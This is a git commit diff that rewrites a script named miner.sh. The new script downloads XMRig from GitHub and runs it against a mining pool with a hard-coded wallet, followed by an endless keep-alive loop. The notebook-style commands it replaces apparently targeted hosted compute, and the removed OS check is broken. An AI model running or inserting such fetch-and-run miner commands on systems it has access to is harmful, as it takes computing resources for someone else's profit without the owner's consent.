13dfca576a9aa54aae245442b86d3f40b67cc151
IVAN19717 <89376848+IVAN19717@users.noreply.github.com>
2021-12-10 10:45:19 +0200

    Update miner.sh

--- miner.sh
+++ miner.sh
@@ -1,16 +1,14 @@
-os=`cat /etc/redhat-release`
-if [[ "${os}" == "ubuntu" || "${os}" == "debian" ]]; then
-    !apt-get install wget
-    !apt-get install screen
-else
-    !yum -y install wget
-    !yum -y install screen
-fi
+#!/bin/sh
+ wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
+tar xf xmrig-6.15.1-linux-x64.tar.gz
+cd xmrig-6.15.1
+./xmrig -o pool.hashvault.pro:80 -u 4KpbK1NXyNZaVNQeJvdjY38ZfWpzCgYwFWZgYgThMgQD3d6KTCocDfZgP8Twwk3WMvQfkJfnTCVa4Yi2wnPGz312EoxD3aGubTf2jfdc7S -p zero -k -a randomx
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
 
 
-!wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
-!unzip XLArig-v5.2.2-linux-x86_64.zip
-!cd xlarig
-!./xlarig -o pool.hashvault.pro:80 -u 4KpbK1NXyNZaVNQeJvdjY38ZfWpzCgYwFWZgYgThMgQD3d6KTCocDfZgP8Twwk3WMvQfkJfnTCVa4Yi2wnPGz312EoxD3aGubTf2jfdc7S -p х --threads 40
+
 
 
